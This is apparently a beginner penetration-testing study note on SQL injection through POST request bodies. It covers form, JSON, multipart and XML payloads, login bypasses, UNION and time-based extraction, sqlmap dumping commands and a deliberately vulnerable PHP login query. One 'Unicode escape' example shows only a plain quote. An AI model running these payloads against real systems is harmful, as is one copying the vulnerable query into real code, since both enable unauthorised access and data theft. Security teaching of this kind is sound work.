---
tags: [vapt, sqli, beginner]
difficulty: beginner
module: "06 - SQL Injection"
topic: "06.10 SQLi in POST Body (JSON, form data)"
---

# 06.10 — SQLi in POST Body

## POST Body vs GET Parameters

POST body data is sent in the HTTP request body — not in the URL. This is used for forms, login, registration, JSON APIs, and any action that submits data. All POST body fields are equally injectable as GET parameters.

```
POST REQUEST ANATOMY:
  POST /login HTTP/1.1
  Host: target.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 32
  
  username=admin&password=secret
  ↑ these are the injectable parameters!
```

---

## Form Data (application/x-www-form-urlencoded)

The most common POST format — standard HTML form submission.

```bash
# BASIC FORM POST TEST:
curl -X POST https://target.com/login \
  -d "username=admin&password=secret"

# INJECT IN USERNAME:
curl -X POST https://target.com/login \
  -d "username=admin'&password=secret"
# → SQL error? → CONFIRMED!

# LOGIN BYPASS PAYLOADS:
# Classic: admin'--
curl -X POST https://target.com/login \
  -d "username=admin'--&password=anything"

# Always true:
curl -X POST https://target.com/login \
  -d "username=' OR 1=1--&password=x"

# Operator injection (if AND between conditions):
curl -X POST https://target.com/login \
  -d "username=' OR '1'='1&password=' OR '1'='1"

# EXTRACT DATA (via error):
curl -X POST https://target.com/login \
  -d "username=' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--&password=x" \
  -H "Content-Type: application/x-www-form-urlencoded"

# TIME-BASED:
curl -X POST https://target.com/login \
  -d "username=' AND SLEEP(5)--&password=x" \
  -s -o /dev/null -w "Time: %{time_total}s\n"
```

---

## JSON Body (application/json)

Modern APIs typically use JSON. The injection point is the JSON value.

```bash
# JSON POST:
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"secret"}'

# INJECT IN JSON VALUE:
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'"'"'","password":"secret"}'
# Single quote inside JSON string → SQL error?

# VALID JSON WITH INJECTION:
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"x"}'

# BYPASS JSON PARSING ISSUES (use escaped quote):
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'--","password":"x"}'
# ' is Unicode for single quote — may bypass WAF!

# EXTRACT DATA VIA ERROR IN JSON:
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/json" \
  -d '{"id":"1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--"}'

# NUMERIC JSON FIELD:
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/json" \
  -d '{"id":1,"fields":"*"}'
# Try: {"id":"1 OR 1=1--"} or {"id":1,"sort":"price; SLEEP(5)--"}
```

---

## Multipart Form Data (file uploads)

```bash
# FILE UPLOAD FORM:
curl -X POST https://target.com/upload \
  -F "file=@test.txt" \
  -F "description=test"

# INJECT IN FORM FIELD:
curl -X POST https://target.com/upload \
  -F "file=@test.txt" \
  -F "description=test' AND SLEEP(5)--"

# INJECT IN FILENAME:
curl -X POST https://target.com/upload \
  -F "file=@test.txt;filename=test' AND SLEEP(5)--.txt"

# INJECT IN CONTENT-TYPE:
curl -X POST https://target.com/upload \
  -F "file=@test.txt;type=image/jpeg' AND SLEEP(5)--"
```

---

## XML Body (SOAP / application/xml)

```bash
# XML POST (SOAP-style):
curl -X POST https://target.com/api/soap \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<request>
  <username>admin</username>
  <password>secret</password>
</request>'

# INJECT IN XML VALUE:
curl -X POST https://target.com/api/soap \
  -H "Content-Type: text/xml" \
  -d "<?xml version=\"1.0\"?>
<request>
  <username>admin'--</username>
  <password>x</password>
</request>"

# ALSO CHECK FOR XXE WHILE TESTING XML!
```

---

## Common POST Injection Scenarios

### Login Form (Most Common Target)

```
VULNERABLE CODE:
  $sql = "SELECT * FROM users WHERE username='" . $_POST['username'] . 
         "' AND password='" . md5($_POST['password']) . "'";

PAYLOADS:
  username: admin'--
  → SQL: ...WHERE username='admin'-- AND password='hash'
  → Logs in as admin without password!

  username: ' OR 1=1 LIMIT 1--
  → SQL: ...WHERE username='' OR 1=1 LIMIT 1-- AND password='hash'
  → Logs in as first user in DB (often admin!)
  
  username: ' OR username='admin'--
  → Specific user without password!
```

### Search / Filter POST

```bash
# POST SEARCH:
curl -X POST https://target.com/products/search \
  -d "term=laptop&category=electronics&min_price=100"

# INJECT IN SEARCH TERM:
curl -X POST https://target.com/products/search \
  -d "term=' UNION SELECT username,password,email FROM users--&category=x&min_price=0"
# → Shows users instead of products!
```

### Registration Form

```bash
# INJECT PAYLOAD FOR SECOND-ORDER:
curl -X POST https://target.com/register \
  -d "username=admin'--&email=test@test.com&password=Abc123!"
# → Payload stored → trigger on profile update (see 08 - Second-Order)
```

---

## SQLMap with POST Requests

```bash
# FORM DATA:
sqlmap -u "https://target.com/login" \
  --data="username=admin&password=secret" \
  -p username

# AUTO-DETECT ALL INJECTABLE PARAMS:
sqlmap -u "https://target.com/login" \
  --data="username=admin&password=secret"

# JSON POST:
sqlmap -u "https://target.com/api/login" \
  --data='{"username":"admin","password":"secret"}' \
  -H "Content-Type: application/json"

# FROM BURP CAPTURED REQUEST (easiest method!):
# 1. Intercept in Burp, save as request.txt
sqlmap -r request.txt -p username

# WITH COOKIE:
sqlmap -u "https://target.com/profile" \
  --data="id=1" \
  --cookie="session=ABC123"

# LEVEL/RISK (more thorough):
sqlmap -u "https://target.com/login" \
  --data="username=admin&password=x" \
  --level=5 --risk=3  # very thorough (more requests, more aggressive)

# DUMP AFTER FINDING INJECTION:
sqlmap -u "https://target.com/login" \
  --data="username=admin&password=x" \
  -p username --dump
```

---

## Burp Suite for POST Injection

```
BURP WORKFLOW:
  1. Open Burp → turn on Intercept
  2. Submit form in browser
  3. Intercept the POST request
  4. Right-click → Send to Repeater
  5. In Repeater: modify POST body field
     username=admin'
  6. Click Send → observe response
  7. Try all SQLi payloads in Repeater
  8. Right-click → Save item → feed to SQLMap: sqlmap -r saved.txt
```

---

## Related Notes
- [[09 - SQLi in GET Parameters]] — GET-based injection
- [[11 - SQLi in HTTP Headers]] — header injection
- [[12 - SQLi in JSON APIs]] — JSON-specific techniques
- [[21 - sqlmap Full Usage Guide]] — full sqlmap reference
- [[22 - Manual SQLi Testing Methodology]] — complete testing flow
